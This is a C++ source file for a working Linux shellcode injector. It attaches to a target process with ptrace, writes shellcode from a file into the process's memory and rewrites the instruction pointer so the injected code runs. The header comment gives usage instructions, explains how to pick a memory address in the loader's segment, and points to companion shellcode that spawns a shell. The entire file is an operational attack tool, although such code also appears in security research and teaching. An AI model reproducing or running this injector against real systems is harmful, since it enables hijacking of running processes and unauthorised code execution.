/**
 * This is a working version.
 * Usage:
 *    ./injector <pid> <memory address> <shell code>
 * Inserts shell code into memory address of process pid, then
 * rewrites pid's next instruction pointer to be the beginning
 * of the injected code.
 *
 * See the file ../shell.x for working shell code that will drop
 * you into a /bin/csh shell.
 *
 * For best usage start a blocking program, find its pid, and then
 * use:
 *   cat /proc/<pid>/maps | grep ld-2.15.so
 * to find the executable segment of the loaders memory. Use the
 * low address as memory address.
**/   

#include <iostream>
#include <cstdlib>
#include <sstream>
#include <string>
#include <cstring>
#include <cerrno>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <fstream>

using namespace std;



/**
 * Globals
**/

int WORD_SIZE = 8;
string SC_FILE = "";
//string SHELLCODE = "";
unsigned long * SHELLCODE;
int SCSIZE = 0;
int OFFSET = 0;
int PID = 0;
unsigned long ADDRESS = 0x0;
char * OPTIONS="o:";



/**
 * Helper functions
**/

unsigned long hextoint (string h) {
  stringstream ss;
  ss << hex << h;
  unsigned long ret;
  ss >> ret;
  return ret;
}

/*void readSCFile(string filename) {
  ifstream ifs(filename.c_str(), ios_base::in | ios_base::binary);
  char tmp[513];
  int cnt = 0;

  while (!ifs.eof()) {
    ifs.read(tmp, 512);
    cnt = (ifs.eof()) ? ifs.gcount()-1 : 512;
    SHELLCODE += string(tmp).substr(0, cnt);
  }
}*/

void readSCFile(string filename) {
  ifstream ifs(filename.c_str(), ios_base::in | ios_base::binary | ios_base::ate);
  SCSIZE = ifs.tellg();
  ifs.seekg(ios::beg);

  int arrSize = SCSIZE / sizeof(unsigned long) + 1;
  cout << "arrSize: " << arrSize << endl;

  SHELLCODE = (unsigned long *) malloc (arrSize * sizeof(unsigned long));
  memset(SHELLCODE, 0x00, arrSize * sizeof(unsigned long));
  unsigned long * start = SHELLCODE;

  char buf[sizeof(unsigned long)];
  int cnt = 0;

  while (!ifs.eof()) {
    ifs.read(buf, sizeof(unsigned long));
    cnt = (ifs.eof()) ? ifs.gcount() : sizeof(unsigned long);
    memcpy(SHELLCODE, buf, cnt);
    SHELLCODE++;
  }

  ifs.seekg(0);
  ifs.close();

  //SHELLCODE = start;
  SHELLCODE -= arrSize;
}


void writeword (unsigned long addr, unsigned long word) {
  int ret = -1;
  int iters = 0;
  while (ret < 0 && iters < 5){
    ret = ptrace(PTRACE_POKEDATA, PID, addr, word);
    if (ret < 0)
      cout << "Failed write with errno: " << errno << endl;
    iters++;
  }

  if (ret < 0) {
    cout << "Bailing out..." << endl;
    ret = ptrace(PTRACE_DETACH, PID, &ADDRESS, NULL);
    if (ret < 0)
      cout << "Detaching exited with errno: " << errno << endl;
    exit(1);
  }

  /*int ret = ptrace(PTRACE_POKEDATA, PID, addr, word);
  if (ret < 0)
    cout << "Failed write with errno: " << errno << endl;*/
}

/**
 * Writes the current $rip to the stack emulating a function call
 * This allows us to use the "ret" statement at the end of our
 * code to allow a clean exit and return control to the process
**/ 
user_regs_struct writeReturnAddr(user_regs_struct regs) {
  unsigned long rbp = regs.rbp;

  // Subtract from RSP
  regs.rsp -= WORD_SIZE;
  // Place the return address at $rsp so that it can be popped by "ret" statement
  writeword(regs.rsp, regs.rip-OFFSET);
  cout << "Write return address (0x" << hex << regs.rip-OFFSET << ") to: 0x" << regs.rsp << endl;
  return regs;
  
}

/**
 * Changes the process' instruction pointer to addr
**/  
unsigned long write_eip (unsigned long addr) {
  user_regs_struct regs;
  int ret = ptrace(PTRACE_GETREGS, PID, NULL, &regs);
  if (ret < 0) 
    cout << "Failed to read registers: " << errno << endl;

  unsigned long orip = regs.rip;
  cout << hex;
  cout << "Old rip: 0x" << regs.rip << endl;
  cout << "New rip: 0x" << addr << endl;
  cout << dec;

  regs = writeReturnAddr(regs);

  regs.rip = addr;
  ret = ptrace(PTRACE_SETREGS, PID, NULL, &regs);
  if (ret < 0)
    cout << "Failed to write registers: " << errno << endl;
  return orip;
}

void write_words () {
  int toShift = 0;
  //cout << "Shellcode length: " << SHELLCODE.length() << endl;
  cout << "Shellcode length: " << SCSIZE << endl;

  unsigned long word = 0;
  int arrSize = SCSIZE / sizeof(unsigned long) + 1;

  // Write each word to the correct place
  //for (int i=0; i<SHELLCODE.length(); i+=WORD_SIZE) {
  for (int i=0; i<arrSize; i++, SHELLCODE++) {
    /*string sword = SHELLCODE.substr(i, WORD_SIZE);
    toShift = (WORD_SIZE-sword.length())*8;
    unsigned long *lword = (unsigned long*)(sword.c_str());
    unsigned long word = *lword << toShift >> toShift;*/
    word = *SHELLCODE;
    cout << "Writing word: " << hex << word << dec << endl;
    writeword(ADDRESS+(i*WORD_SIZE), word);
  }

  // Was to allow us to jump to the end of our code effectively
  // returning to the controlling process.... needed anymore?
  unsigned long ret = write_eip(ADDRESS+2);
}

void usage(char * argv[]) {
  cout << "Usage: " << argv[0] << " [-o offset] <pid> <address> <sc file>" << endl;
  exit(1);
}


void parseOptions(int argc, char * argv[]) {
  int c;
  
  while ((c = getopt (argc, argv, OPTIONS)) != -1) {
    switch (c) {
      case 'o':
        OFFSET = atoi(optarg);
        break;
      default:
        usage(argv);
    }
  }

  int index = 0;
  for (index = optind; index < argc; index++){
    int pos = (argc-1) - index;
    switch (pos) {
      case 2:
        PID = atoi(argv[index]);
        break;
      case 1:
        ADDRESS = hextoint(argv[index]);
        break;
      case 0:
        readSCFile(string(argv[index]));
        break;
      default:
        usage(argv);
    }
  }

  if (argc-index != 0) {
    cout << "Index at time of failure " << index << endl;
    cout << "Unknown extra options" << endl;
    usage(argv);
  }
}


int main(int argc, char * argv[]) {

  parseOptions(argc, argv);
  cout << "PID: " << PID << endl;
  cout << "ADDRESS: " << hex << ADDRESS << dec << endl;
  cout << "OFFSET: " << OFFSET << endl;

  cout << "Attaching to pid: " << PID << endl;
  cout << "Mucking with memory at: ";
  cout << hex <<  ADDRESS << dec << endl << endl;

  int ret = ptrace (PTRACE_ATTACH, PID, ADDRESS, 0);
  wait();
  if (ret < 0)
    cout << "Attach exited with errno: " << errno << endl;
  
  write_words ();


  ret = ptrace(PTRACE_DETACH, PID, &ADDRESS, NULL);
  if (ret < 0)
    cout << "Detaching exited with errno: " << errno << endl;
  return 0;
}

